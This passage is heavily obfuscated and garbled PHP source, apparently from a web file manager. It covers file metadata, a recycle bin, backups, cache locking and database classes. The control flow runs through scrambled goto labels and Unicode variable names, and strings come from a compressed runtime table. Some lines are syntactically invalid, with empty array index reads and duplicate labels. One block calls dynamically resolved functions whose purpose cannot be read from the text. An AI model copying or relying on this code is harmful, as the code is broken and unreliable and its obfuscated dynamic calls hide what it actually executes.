$this->metaSet($aɸ, $Eū[415], null); return; } $fᲇ = array($Eū[416] => str_replace($Eū[50], $Eū[33], Pinyin::encode($Bӄ)), $Eū[415] => Pinyin::encode($Bӄ, $Eū[529])); $this->metaSet($aɸ, $fᲇ); } public function getContent($F¾) { goto Bؒ; Bؒ: $cϐ՝ =& $_SERVER[]; $E࢛Ժ = $this->fileInfoGet($F¾); if (!$E࢛Ժ) { return !1; } goto c; c: if ($E࢛Ժ[$cϐ՝[77]] == 0) { return $cϐ՝[33]; } $b憄Ζ = $cϐ՝[2374] . $E࢛Ժ[$cϐ՝[163]]; if ($E࢛Ժ[$cϐ՝[77]] <= 1024 * 10) { $e𺇗 = Cache::get($b憄Ζ); if (!$e𺇗) { $e𺇗 = IO::getContent($E࢛Ժ[$cϐ՝[75]]); Cache::set($b憄Ζ, $e𺇗); } return $e𺇗; } goto b̡; b̡: return IO::getContent($E࢛Ժ[$cϐ՝[75]]); goto aѯ; aѯ: } public function setDesc($cϰ, $dʅ) { $c =& $_SERVER[]; Model($c[505])->eventAddDesc($cϰ, $dʅ); return $this->metaSet($cϰ, $c[405], $dʅ); } public function setContent($eݳ, $fгʧ = '') { goto DØ; a֌: if (!$b || !$Eᩂ) { return !1; } $Fϖ = Model($d襋[422])->addFileByContent($fгʧ, $Eᩂ[$d襋[28]]); $a䤊 = $this->fileHistory($Eᩂ, $Fϖ[$d襋[419]], $Fϖ[$d襋[77]]); goto dӄ͓; dӄ͓: if (!$a䤊) { return Model($d襋[422])->remove($Fϖ[$d襋[419]]); } $this->folderSizeReset($Eᩂ[$d襋[461]]); return !0; goto fϷߪ; DØ: $d襋 =& $_SERVER[]; $Eᩂ = $this->sourceInfo($eݳ); $b = $this->fileInfoGet($eݳ); goto a֌; fϷߪ: } public function fileSubstr($aʋ, $dݕ, $Cޥά) { $EҔ = $this->fileInfoGet($aʋ); if (!$EҔ) { return !1; } return IO::fileSubstr($EҔ[$_SERVER[][75]], $dݕ, $Cޥά); } public function fileInfoGet($D⎠Ӟ) { goto bһŏ; bһŏ: $B뮧 =& $_SERVER[]; $d׋ = $this->sourceInfo($D⎠Ӟ); if (!$d׋ || $d׋[$B뮧[370]]) { return !1; } goto cǺč; F䄄: return $e䦏; goto b՚눓; c: $e䦏 = Model($B뮧[422])->fileInfo($d׋[$B뮧[419]]); if ($e䦏) { $e䦏[$B뮧[28]] = $d׋[$B뮧[28]]; } self::$cacheFileInfo[$DƊ] = $e䦏; goto F䄄; cǺč: $DƊ = $B뮧[425] . $d׋[$B뮧[419]]; $fӓ = _get(self::$cacheFileInfo, $DƊ); if ($fӓ) { return $fӓ; } goto c; b՚눓: } private function folderChildrenNumber($e🊃) { $bϿ =& $_SERVER[]; $A͋ = $this->sourceInfo($e🊃); $a = array($bϿ[525] => array($bϿ[483], $A͋[$bϿ[459]] . $e🊃 . $bϿ[484]), $bϿ[396] => intval($A͋[$bϿ[397]]), $bϿ[518] => 1); $d = $this->where($a)->count(); $F埳 = $this->where($a)->where(array($bϿ[518] => 0))->count(); return array($bϿ[81] => $F埳, $bϿ[82] => $d); } public function pathInfo($Aă, $b = false) { goto c; Aܞý: $Aף = $this->_listDataApplyItem($Aף, $b); self::$cachePathInfo[$E] = $Aף; return $Aף; goto B; D߅Ԣ: if ($Eܺ) { return $Eܺ; } $Aף = $this->sourceInfo($Aă); if (!$Aף) { return !1; } goto Aܞý; c: $d =& $_SERVER[]; $E = $d[411] . intval($b) . $d[412] . $Aă; $Eܺ = _get(self::$cachePathInfo, $E); goto D߅Ԣ; B: } public static $cachePathInfoMore = array(); public function pathInfoMore($D) { goto a; Cګ: self::$cachePathInfoMore[$D] = $D͑ꍹ; return $D͑ꍹ; goto D؇; d״: $D͑ꍹ = $this->pathInfo($D); if (!$D͑ꍹ) { return !1; } if ($D͑ꍹ[$Fɽ[370]] == $Fɽ[83]) { $D͑ꍹ[$Fɽ[80]] = $this->folderChildrenNumber($D); } goto Cګ; a: $Fɽ =& $_SERVER[]; $c̳ = _get(self::$cachePathInfoMore, $D); if ($c̳) { return $c̳; } goto d״; D؇: } public function sourceInfo($Bܿ) { goto E; E: $bԢ =& $_SERVER[]; if (!$Bܿ) { return array(); } $cتк = $bԢ[410] . $Bܿ; goto E廅; FЛ: self::$cacheSourceInfo[$cتк] = $aᥤ; return self::$cacheSourceInfo[$cتк]; goto F; E廅: $e = _get(self::$cacheSourceInfo, $cتк); if ($e) { return $e; } $aᥤ = $this->where(array($bԢ[369] => $Bܿ))->find(); goto FЛ; F: } public function sourceCacheClear($Aږ = false) { if ($Aږ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[][410] . $Aږ]); } public function pathInfoByPath($b, $Cલ) { $Aߋ =& $_SERVER[]; $fԲ葎 = !$Cલ ? array() : explode($Aߋ[8], trim($Cલ, $Aߋ[8])); $fԞ = $b; foreach ($fԲ葎 as $f) { $bۂ = array($Aߋ[461] => $fԞ, $Aߋ[28] => $f); $Cۅ = $this->where($bۂ)->select(); if (!$Cۅ) { return !1; } $Cۅ = array_sort_by($Cۅ, $Aߋ[397]); $fԞ = $Cۅ[0][$Aߋ[369]]; } return $this->pathInfo($fԞ, !0); } protected function updateModifyTime($dڡ) { goto f; f: $Dש =& $_SERVER[]; if (!$dڡ) { return; } if (!is_array($dڡ)) { $dڡ = array($dڡ); } goto AǏ̆; AǏ̆: foreach ($dڡ as $bĉ => $c) { $dڡ[$bĉ] = intval($c); } $f = array($Dש[369] => array($Dש[7], $dڡ)); $C۽ߎ = array($Dש[524] => USER_ID, $Dש[390] => time()); goto C; C: $this->where($f)->save($C۽ߎ); goto c; c: } public function folderSizeReset($e) { goto A; Dˆ: $Fڥ = $this->parentLevelArray($C[$A[459]]); if ($Fڥ) { $e = array($A[369] => array($A[384], $Fڥ)); if ($Eۖˏ < 0) { $e[$A[77]] = array($A[944], abs($Eۖˏ)); } $this->where($e)->setAdd($A[77], $Eۖˏ); } $this->targetSpaceUpdate($C[$A[371]], $C[$A[456]]); goto C蟎͏; F: $e = array($A[368] => $e, $A[396] => 0); $dȞ = $this->where($e)->sum($A[77]); $dȞ = intval($dȞ); goto bǑ; bǑ: $Eۖˏ = $dȞ - intval($C[$A[77]]); if ($Eۖˏ == 0) { return CacheLock::unlock($E閧); } $this->where(array($A[383] => $e))->setField($A[77], $dȞ); goto Dˆ; A: $A =& $_SERVER[]; if ($this->statusIgnoreResetSpace) { return; } $E閧 = $A[2375] . $e; goto Fۖ掽; Fۖ掽: CacheLock::lock($E閧, 20); $this->sourceCacheClear($e); $C = $this->sourceInfo($e); goto F; C蟎͏: CacheLock::unlock($E閧); goto Eϭ鷝; Eϭ鷝: } public function folderSizeResetChildren($Eש) { goto a; bðτ: foreach ($d̍ as $E) { $b؈ = $E[$eቋ[461]] . $eቋ[33]; if (!isset($Bå[$b؈])) { continue; } if ($E[$eቋ[397]] == $Bå[$b؈][$eቋ[397]]) { $Bå[$b؈][$eቋ[77]] += $E[$eቋ[77]]; } } foreach ($Bå as $E) { $A˨ = $this->parentLevelArray($E[$eቋ[459]]); foreach ($A˨ as $b؈) { $b؈ = $b؈ . $eቋ[33]; if (!isset($Bå[$b؈])) { continue; } if ($E[$eቋ[397]] == $Bå[$b؈][$eቋ[397]]) { $Bå[$b؈][$eቋ[77]] += $E[$eቋ[77]]; } } } $F = array(); goto AǊ; F: $Bå[] = $a; $Bå = array_to_keyvalue($Bå, $eቋ[369]); foreach ($Bå as $D => $E) { $Bå[$D][$eቋ[2377]] = $Bå[$D][$eቋ[77]]; $Bå[$D][$eቋ[77]] = 0; } goto bðτ; b: $F = array($eቋ[518] => 1, $eቋ[525] => array($eቋ[483], $a[$eቋ[459]] . $Eש . $eቋ[484])); $E = $eቋ[2376]; $Bå = $this->field($E)->where($F)->select(); goto a; AǊ: foreach ($Bå as $E) { if ($E[$eቋ[77]] == $E[$eቋ[2377]]) { continue; } $F[] = array($eቋ[369], $E[$eቋ[369]], $eቋ[77], $E[$eቋ[77]]); } $this->saveAll($F); goto fل; a: $F[$eቋ[370]] = 0; $d̍ = $this->field($E)->where($F)->select(); if (!$d̍) { return; } goto F; a: $eቋ =& $_SERVER[]; $this->sourceCacheClear($Eש); $a = $this->sourceInfo($Eש); goto b; fل: } public function userSpaceReset($Dʰ = false) { $f =& $_SERVER[]; $D = $this->where(array($f[371] => self::TYPE_USER, $f[456] => $Dʰ, $f[370] => 0))->sum($f[77]); Model($f[474])->userEdit($Dʰ, array($f[2107] => $D)); } public function targetSpaceUpdate($FѺ, $c) { $Cן =& $_SERVER[]; if (!$c) { return; } if (!in_array($FѺ, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $a֍ = $this->targetSpaceSize($FѺ, $c); if ($FѺ == self::TYPE_USER) { Model($Cן[474])->userEdit($c, array($Cן[2107] => $a֍)); } else { if ($FѺ == self::TYPE_GROUP) { Model($Cן[458])->groupEdit($c, array($Cן[2107] => $a֍)); } } } public function targetSpaceSize($c, $e) { goto DФݡ; DФݡ: $fߨ =& $_SERVER[]; $F = $this->sourceRoot($c, $e, !0); if (!$F) { return 0; } goto d苑; d苑: $cݻ = floatval($F[$fߨ[77]]); $FǣѬ = array($fߨ[525] => array($fߨ[483], $fߨ[470] . $F[$fߨ[369]] . $fߨ[484])); $D = Model($fߨ[395])->field($fߨ[383])->where($FǣѬ)->select(); goto b󯩂ͤ; cł: return $cݻ; goto D텊; b󯩂ͤ: $D = array_to_keyvalue($D, $fߨ[33], $fߨ[369]); $D = array_unique(array_filter($D)); if ($D) { $FǣѬ = array($fߨ[383] => array($fߨ[384], $D)); $cݻ += floatval($this->where($FǣѬ)->sum($fߨ[77])); } goto cł; D텊: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($fմ) { return $this->fileTypeProfile($fմ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Dὦ͑) { return $this->fileTypeProfile($Dὦ͑, SourceModel::TYPE_GROUP); } private function fileTypeProfile($D, $Cբ) { goto C; C: $c幡 =& $_SERVER[]; $F޴ݝ = $c幡[2378] . $D . $c幡[70] . $Cբ; $Eҿ = Cache::get($F޴ݝ); goto eĥ; c: foreach ($e as $F̉ => $fҫķ) { $b݃[$c幡[372]] = $this->fileTypeWhere($F̉); $Dӊ[$F̉] = array($c幡[2380] => $fҫķ[$c幡[28]], $c幡[2381] => $this->where($b݃)->count(), $c幡[520] => $this->where($b݃)->sum($c幡[77])); } Cache::set($F޴ݝ, $Dӊ, 1200); return $Dӊ; goto cф; C鯻Ƴ: $Dӊ = array(); $Dӊ[$c幡[2379]] = array($c幡[2380] => LNG($c幡[2379]), $c幡[2381] => $this->where($b݃)->count(), $c幡[520] => $this->where($b݃)->sum($c幡[77])); $e = KodIO::fileTypeList(); goto c; eĥ: if ($Eҿ) { return $Eҿ; } $b݃ = array($c幡[518] => 0); if ($D != !1) { $b݃[$c幡[456]] = $D; $b݃[$c幡[371]] = $Cբ; } goto C鯻Ƴ; cф: } public function fileNameExist($AЮ, $A޸) { $B틂 =& $_SERVER[]; $Dܕ = $this->childList($AЮ); foreach ($Dܕ as $a񵌙) { if ($a񵌙[$B틂[28]] == $A޸) { return $a񵌙[$B틂[369]]; } } return !1; } public function childList($aÏ) { goto D; C絮: $B = array($b[461] => intval($aÏ), $b[397] => 0); $E˯ = $this->where($B)->select(); $E˯ = $E˯ ? $E˯ : array(); goto Aꢼ; D: $b =& $_SERVER[]; $D = $b[2359] . $aÏ; if (isset(self::$cacheChildList[$D])) { return self::$cacheChildList[$D]; } goto C絮; Aꢼ: self::$cacheChildList[$D] = $E˯; foreach ($E˯ as $F) { $D = $b[410] . $F[$b[369]]; self::$cacheSourceInfo[$D] = $F; } return $E˯; goto Bܬ; Bܬ: } public function fileNameAuto($d, $DӰ, $Bڞ = REPEAT_RENAME, $A = false) { $b㡦ְ =& $_SERVER[]; $e = $this->childList($d); $Fϛ = array_to_keyvalue($e, $b㡦ְ[33], $b㡦ְ[28]); return $this->fileNameAutoGet($Fϛ, $DӰ, $Bڞ, $A); } public function fileNameAutoGet($D, $E畸, $cՐ, $C烮) { $b̈́Є =& $_SERVER[]; if ($cՐ == REPEAT_REPLACE || !$D || !in_array_not_case($E畸, $D) || $C烮 && $cՐ != REPEAT_RENAME_FOLDER) { return $E畸; } if ($cՐ == REPEAT_SKIP) { return !1; } $A߬ = $b̈́Є[91] . get_path_ext($E畸); $A߬ = $A߬ == $b̈́Є[91] || $C烮 ? $b̈́Є[33] : $A߬; for ($Aʎ = 1; $Aʎ <= count($D) + 1; $Aʎ++) { $CꜤ = substr($E畸, 0, strlen($E畸) - strlen($A߬)); $Bӡ = $CꜤ . "\50{$Aʎ}\x29{$A߬}"; if (!in_array_not_case($Bӡ, $D)) { return $Bӡ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\165\162\x63\145\x5f\x72\x65\143\x79\x63\154\145"; protected $dataAuto = array(array("\143\162\145\141\x74\145\x54\151\x6d\x65", "\x74\151\155\145", "\151\x6e\x73\x65\162\164", "\x66\165\156\143\164\x69\x6f\156")); public function listData($CՎ = false) { $d׎ =& $_SERVER[]; $CՎ = $CՎ ? $CՎ : USER_ID; $F惶 = $this->where(array($d׎[1444] => $CՎ))->select(); return array_to_keyvalue($F惶, $d׎[33], $d׎[369]); } public function moveToRecycle($DÎ쒝) { goto D; Bʰ: if (!$c || $c[$Aݸᐙ[397]] == $Aݸᐙ[83]) { return; } $AﴄҠ = array($Aݸᐙ[383] => $DÎ쒝, $Aݸᐙ[1444] => USER_ID, $Aݸᐙ[521] => $c[$Aݸᐙ[371]], $Aݸᐙ[522] => $c[$Aݸᐙ[456]], $Aݸᐙ[525] => $c[$Aݸᐙ[459]]); $this->add($AﴄҠ); goto E䐦; D: $Aݸᐙ =& $_SERVER[]; $cᅌ = Model($Aݸᐙ[1133]); $c = $cᅌ->sourceInfo($DÎ쒝); goto Bʰ; E䐦: $this->recycleMove($DÎ쒝, 1); if ($c[$Aݸᐙ[370]] == $Aݸᐙ[83]) { $Cʙ = array($Aݸᐙ[525] => array($Aݸᐙ[483], $c[$Aݸᐙ[459]] . $DÎ쒝 . $Aݸᐙ[484])); $cᅌ->where($Cʙ)->setField($Aݸᐙ[397], 1); } goto Aᑢ; Aᑢ: } public function clear() { $this->remove(!1); } public function remove($B妓 = false) { goto Cٷ; Cٷ: $aū =& $_SERVER[]; $d֦⫡ = Model($aū[1133]); $F䅶駠 = $this->listData(); goto b֒; E֕¬: foreach ($f繞 as $EȺƓ) { $d֦⫡->targetSpaceUpdate($EȺƓ[$aū[371]], $EȺƓ[$aū[456]]); } goto d˳; b֒: $B妓 = $B妓 === !1 ? !1 : $B妓; $f繞 = array(); foreach ($F䅶駠 as $fÑٛ) { if ($B妓 != !1 && !in_array($fÑٛ, $B妓)) { continue; } $d֦⫡->remove($fÑٛ, !1); $C䊆 = $this->where(array($aū[369] => $fÑٛ))->find(); $b钂 = $C䊆[$aū[371]] . $aū[70] . $C䊆[$aū[456]]; $f繞[$b钂] = array($aū[521] => $C䊆[$aū[371]], $aū[456] => $C䊆[$aū[456]]); $this->where(array($aū[369] => $fÑٛ))->delete(); } goto E֕¬; d˳: } public function restore($C° = false) { goto Cط; Cܳ: $C° = $C° == !1 ? !1 : $C°; if (!$A) { return !0; } $c嬰 = array(); goto EÇ; Cط: $B睗 =& $_SERVER[]; $DЛ = Model($B睗[1133]); $A = $this->listData(); goto Cܳ; EÇ: foreach ($A as $e) { goto Eߏ; dɅ: $c嬰[] = $aĵ[$B睗[461]]; if ($aĵ[$B睗[370]] == $B睗[83]) { $c嬰[] = $e; } $DЛ->lockMoveEnd($e); goto A; bۿ: if ($aĵ[$B睗[370]] == $B睗[83]) { $Aᔓ = array($B睗[525] => array($B睗[483], $aĵ[$B睗[459]] . $e . $B睗[484])); $DЛ->where($Aᔓ)->setField($B睗[397], 0); $this->restoreFolderChildren($e, $A); } $this->where(array($B睗[369] => $e))->delete(); $DЛ->folderSizeReset($aĵ[$B睗[461]]); goto dɅ; Eߏ: if ($C° != !1 && !in_array($e, $C°)) { continue; } $aĵ = $DЛ->sourceInfo($e); $D = $DЛ->sourceInfo($aĵ[$B睗[461]]); goto Cȥ; Cȥ: if ($D[$B睗[397]] == $B睗[83]) { continue; } $DЛ->lockMoveStart($e); $this->recycleMove($e, 0); goto bۿ; A: } $DЛ->updateModifyTime($c嬰); goto e; e: } private function restoreFolderChildren($B܅, $dѯֶ) { goto aʂ; D: foreach ($dѯֶ as $a) { if ($a == $B܅) { continue; } if (!$Dլƙ->isParentOf($B܅, $a)) { continue; } $B = $Dլƙ->sourceInfo($a); if ($B[$C̆џ[370]] == $C̆џ[83]) { $CŲ[] = array($C̆џ[525] => array($C̆џ[483], $B[$C̆џ[459]] . $a . $C̆џ[484])); } else { $CŲ[$C̆џ[369]][1][] = $a; } } if (!$CŲ[$C̆џ[369]][1]) { unset($CŲ[$C̆џ[369]]); } if (!$CŲ) { return; } goto cسݕ; aʂ: $C̆џ =& $_SERVER[]; $Dլƙ = Model($C̆џ[1133]); $CŲ = array($C̆џ[369] => array($C̆џ[7], array())); goto D; cسݕ: $CŲ[$C̆џ[369]][1] = array_unique($CŲ[$C̆џ[369]][1]); $CŲ[$C̆џ[929]] = $C̆џ[2203]; $Dլƙ->where($CŲ)->setField($C̆џ[397], 1); goto bꎵ; bꎵ: } private function recycleMove($a꽔, $F = 1) { $Bӕ =& $_SERVER[]; $aƾ = Model($Bӕ[1133]); $Ẻ = Model($Bӕ[2382]); $E = array($Bӕ[369] => $a꽔); if ($F) { $aƾ->where($E)->setField($Bӕ[397], 1); $Ẻ->eventRecycle($a꽔, $Bӕ[2383]); } else { $Aŭ = $aƾ->where($E)->find(); $b = $Aŭ[$Bӕ[370]] == $Bӕ[83]; $C򥻈 = $aƾ->fileNameAuto($Aŭ[$Bӕ[461]], $Aŭ[$Bӕ[28]], REPEAT_RENAME_FOLDER, $b); if ($C򥻈 != $Aŭ[$Bӕ[28]]) { $aƾ->rename($a꽔, $C򥻈); } $aƾ->where($E)->setField($Bӕ[397], 0); $Ẻ->eventRecycle($a꽔, $Bӕ[2384]); } } } goto dŪȪ; f: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[͒] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function Model($e = '', $cչ㳤 = '', $Aנ = '') { goto fА; C׈: if (isset($aι[$aψ])) { return $aι[$aψ]; } if ($e) { $e = strtoupper($e[0]) . substr($e, 1); $A = $e . $fͲظ[1]; if (class_exists($A)) { $aι[$aψ] = new $A(); return $aι[$aψ]; } } if (!$Aנ) { $Aנ = $GLOBALS[$fͲظ[2]][$fͲظ[3]]; } goto F𖎩; fА: $fͲظ =& $_SERVER[͒]; static $aι = array(); $aψ = strtolower($cչ㳤 . $fͲظ[0] . $e); goto C׈; F𖎩: $aι[$aψ] = new ModelBase($e, $cչ㳤, $Aנ); return $aι[$aψ]; goto fÐǅ; fÐǅ: } goto F; a䛿: $dڬѧɇ = $_SERVER[][699]; if ($_SERVER[$_SERVER[][700]] != $dڬѧɇ($F)) { goto FĦ; BëҒ: $fȑ = explode($_SERVER[][217], $B̴); if (count($fȑ) < $_SERVER[][557]) { $eЋ = $_SERVER[][704]; $eЋ(); } $E = $_SERVER[][705]; goto eڄ; FĦ: $fǷ = $_SERVER[][701]; $dɘ = $_SERVER[$_SERVER[][702]] . $_SERVER[][703]; $B̴ = $fǷ($dɘ); goto BëҒ; eڄ: $E($F); goto dܬ; dܬ: } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $aއ =& $_SERVER[]; self::$name = date($aއ[706]); if (!($aБ = Model($aއ[707])->lastItem())) { $aБ = $this->initData(); } else { self::$name = $aБ[$aއ[28]]; if ($aБ[$aއ[708]] == $aއ[83]) { self::$name = date($aއ[709]); $fǗ = 0; if (isset($aБ[$aއ[281]][$aއ[167]][$aއ[419]])) { $fǗ = (int) $aБ[$aއ[281]][$aއ[167]][$aއ[419]]; } if ($aБ[$aއ[28]] == self::$name) { Model($aއ[707])->remove($aБ[$aއ[367]]); } $aБ = $this->initData($fǗ, $aБ[$aއ[710]]); } else { $this->checkStore($aБ[$aއ[710]]); } } self::$option = $aБ; } private function initData($AҌ = 0, $e϶ǅ = '') { goto d׮; d׮: $cךˉ =& $_SERVER[]; $f٥ = Model($cךˉ[707])->config(); if ($e϶ǅ && $f٥[$cךˉ[710]] != $e϶ǅ) { $AҌ = 0; } goto CӋ; CӋ: $this->checkStore($f٥[$cךˉ[710]]); $fφ = array($cךˉ[710] => $f٥[$cךˉ[710]], $cךˉ[28] => self::$name, $cךˉ[708] => 0, $cךˉ[711] => $f٥[$cךˉ[711]], $cךˉ[281] => array($cךˉ[712] => array($cךˉ[708] => 0), $cךˉ[713] => array($cךˉ[708] => 0, $cךˉ[714] => 0, $cךˉ[715] => 0, $cךˉ[29] => $cךˉ[33]), $cךˉ[716] => array($cךˉ[708] => 0, $cךˉ[714] => 0, $cךˉ[715] => 0), $cךˉ[167] => array($cךˉ[708] => 0, $cךˉ[717] => 0, $cךˉ[718] => 0, $cךˉ[719] => 0, $cךˉ[720] => 0, $cךˉ[419] => $AҌ)), $cךˉ[721] => time(), $cךˉ[722] => 0); $fτ = Model($cךˉ[707])->insert($fφ); goto B; B: $fφ[$cךˉ[367]] = $fτ; return $fφ; goto d; d: } private function checkStore($c) { $f𔠪 =& $_SERVER[]; $E = Model($f𔠪[723])->listData($c); Model($f𔠪[723])->checkConfig($E); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[][707])->findByName(self::$name); } return self::$option; } public static function set($F) { $Cι =& $_SERVER[]; $b = self::get(); foreach ($F as $DĐ => $C㨄) { $Eԑ = explode($Cι[91], $DĐ); $Cۜ = count($Eԑ); switch ($Cۜ) { case 1: $b[$Eԑ[0]] = $C㨄; break; case 2: $b[$Eԑ[0]][$Eԑ[1]] = $C㨄; break; case 3: $b[$Eԑ[0]][$Eԑ[1]][$Eԑ[2]] = $C㨄; break; } } Model($Cι[707])->update($b[$Cι[367]], $b); self::$option = $b; return self::$option; } public function keep() { $aȎ =& $_SERVER[]; $A͆ = self::get(); if ($A͆[$aȎ[281]][$aȎ[712]][$aȎ[708]] == $aȎ[83]) { return; } $this->backupKeep($A͆); self::set(array($aȎ[724] => 1)); } private function backupKeep($E) { goto E; E: $DĜ =& $_SERVER[]; $e = Model($DĜ[707])->listData(); if (empty($e)) { return; } goto Eκ; Eκ: $e = 0; $Fэ = array(); foreach ($e as $e⡹팮) { if ($e >= 7) { break; } $Fэ[] = $e⡹팮[$DĜ[28]]; $e++; } goto C痷; C痷: for ($e = 0; $e < 12; $e++) { $Fэ[] = date($DĜ[725], strtotime("\55{$e}\x20\x6d\157\x6e\x74\x68\163")); } $Fэ = array_unique($Fэ); foreach ($e as $e⡹팮) { if (!empty($e⡹팮[$DĜ[28]]) && in_array($e⡹팮[$DĜ[28]], $Fэ)) { continue; } Model($DĜ[707])->remove($e⡹팮[$DĜ[367]]); $d = "\173\151\157\x3a{$E[$DĜ[710]]}\175\57\144\x61\x74\x61\x62\x61\x73\x65\x2f\x62\x61\143\x6b\165\x70\x5f{$e⡹팮[$DĜ[28]]}"; IO::remove($d, !1); } goto B׬܄; B׬܄: } public function db() { goto f̨ݵ举; dʳ: $Fڙ = new BackupDb(); if (!$Fڙ->index()) { return !1; } self::set(array($bّ[726] => 1)); goto aǪĺ; aǪĺ: return !0; goto F; f̨ݵ举: $bّ =& $_SERVER[]; $e׹ = self::get(); if ($e׹[$bّ[281]][$bّ[713]][$bّ[708]] == $bّ[83]) { return !0; } goto dʳ; F: } public function dbFile() { goto Cʃ; Cʃ: $a̓ =& $_SERVER[]; $aܽ = self::get(); if ($aܽ[$a̓[281]][$a̓[716]][$a̓[708]] == $a̓[83]) { return !0; } goto bĊ; FȆ: return !0; goto e; bĊ: $A⥗ = new BackupDbFile(); if (!$A⥗->index()) { return !1; } self::set(array($a̓[727] => 1)); goto FȆ; e: } public function file() { $d¯ =& $_SERVER[]; $EĔ = self::get(); if ($EĔ[$d¯[281]][$d¯[167]][$d¯[708]] == $d¯[83]) { return !0; } if (!isset($EĔ[$d¯[711]]) || $EĔ[$d¯[711]] == $d¯[468]) { $Aҗ = new BackupFile(); if (!$Aҗ->index()) { return !1; } } self::set(array($d¯[728] => 1, $d¯[708] => 1)); return !0; } } goto f੎; c: class CacheLockMemcached { public function lock($f, $Cޑ󊸔 = 0) { $eҞ = Cache::init(); $c֏ = microtime(!0) + $Cޑ󊸔; while (microtime(!0) < $c֏) { $Dά󔌨 = $eҞ->get($f); if (!$Dά󔌨 || $Dά󔌨 < microtime(!0)) { $a = $eҞ->handle->add($f, $c֏, $Cޑ󊸔); if ($a) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($bٷ͛) { return Cache::init()->get($bٷ͛); } public function unlock($Aۏ) { return Cache::init()->remove($Aۏ); } } class CacheLockDatabase { public function lock($fꤹ, $f٪ = 0) { $e۷ = Model($_SERVER[][776]); $bێ = microtime(!0) + $f٪; while (microtime(!0) < $bێ) { $F = $e۷->get($fꤹ); if (!$F || $F < microtime(!0)) { $dΝ = $e۷->set($fꤹ, $bێ); if ($dΝ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($d׌ʌ) { return Model($_SERVER[][776])->get($d׌ʌ); } public function unlock($C) { Model($_SERVER[][776])->remove($C); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($b, $c) { $e =& $_SERVER[]; if (!class_exists($e[797])) { show_json($e[798], !1); } $this->cacheTime = $c; $this->handle = new Memcached(); if (is_array($b[$e[799]]) && count($b[$e[799]]) >= 1) { foreach ($b[$e[799]] as $a搉) { $aھ = explode($e[4], $a搉); $this->handle->addServer($aھ[0], $aھ[1]); } } else { $this->handle->addServer($b[$e[169]], $b[$e[170]]); } } public function set($f, $Eّ, $Bݢі = false) { $Bݢі = $Bݢі ? $Bݢі : $this->cacheTime; return $this->handle->set($f, $Eّ, $Bݢі); } public function get($a䜂͏) { return $this->handle->get($a䜂͏); } public function remove($CÉ) { return $this->handle->delete($CÉ); } public function deleteAll() { return $this->handle->flush(); } } goto Fʅ; C: class DbSqlite3 extends DbSqlite3Base { public function query($C) { goto Dˍ; fϤ: fclose($cߠ); show_json($A҈[889], !1); return !1; goto d; Dˍ: $A҈ =& $_SERVER[]; $E⎂ = DATA_PATH . $A҈[887]; $cߠ = fopen($E⎂, $A҈[888]); goto eϊ; eϊ: if (!$cߠ) { return !1; } if (flock($cߠ, LOCK_EX)) { $D = parent::query($C); flock($cߠ, LOCK_UN); fclose($cߠ); return $D; } flock($cߠ, LOCK_UN); goto fϤ; d: } public function execute($c) { goto d߸; d߸: $bՋ =& $_SERVER[]; $d = DATA_PATH . $bՋ[887]; $Eʻ = fopen($d, $bՋ[888]); goto D̗; D̗: if (!$Eʻ) { return !1; } if (flock($Eʻ, LOCK_EX)) { $dΑ = parent::execute($c); flock($Eʻ, LOCK_UN); fclose($Eʻ); return $dΑ; } flock($Eʻ, LOCK_UN); goto a܉ŵ; a܉ŵ: fclose($Eʻ); show_json($bՋ[889], !1); return !1; goto C܆ߝ; C܆ߝ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\x65\161" => "\74\76", "\x67\164" => "\76", "\x65\x67\x74" => "\76\75", "\x6c\164" => "\74", "\x65\154\x74" => "\74\x3d", "\x6e\x6f\164\x6c\x69\153\145" => "\116\x4f\x54\x20\x4c\111\113\x45", "\x6c\x69\x6b\145" => "\114\111\113\x45", "\x69\156" => "\x49\116", "\156\x6f\164\151\156" => "\x4e\117\x54\x20\111\116", "\156\x6f\164\x20\151\x6e" => "\x4e\x4f\x54\x20\111\x4e", "\142\145\164\167\x65\145\156" => "\102\x45\124\x57\x45\105\x4e", "\x6e\157\x74\142\145\x74\x77\x65\145\x6e" => "\116\117\x54\x20\102\105\124\127\105\x45\x4e", "\156\157\x74\x20\x62\145\164\x77\x65\x65\156" => "\x4e\x4f\124\x20\102\105\x54\x57\105\105\116"); protected $selectSql = "\123\105\114\x45\103\x54\x25\104\x49\x53\x54\x49\x4e\103\x54\45\40\x25\x46\111\105\x4c\104\45\40\x46\122\x4f\115\40\x25\124\x41\x42\114\x45\x25\45\x4a\x4f\x49\x4e\x25\x25\127\110\105\122\105\45\x25\x47\x52\x4f\x55\x50\45\45\x48\x41\126\x49\116\x47\45\45\x4f\x52\104\105\122\45\x25\x4c\111\x4d\x49\124\x25\x20\45\125\x4e\x49\117\116\x25\x25\103\x4f\115\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $cɈ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[][890], $cɈ); } public function factory($eĤ = '') { goto F; D: return $bƚ; goto fщ; F: $bߣ =& $_SERVER[]; $eĤ = $this->parseConfig($eĤ); if (empty($eĤ[$bߣ[891]])) { think_exception(think_lang($bߣ[892])); } goto Eό; Eό: $this->dbType = ucwords(strtolower($eĤ[$bߣ[891]])); $f = $bߣ[893] . $this->dbType; if (class_exists($f)) { $bƚ = new $f($eĤ); if ($bߣ[743] != strtolower($eĤ[$bߣ[891]])) { $bƚ->dbType = strtoupper($this->dbType); } else { $bƚ->dbType = 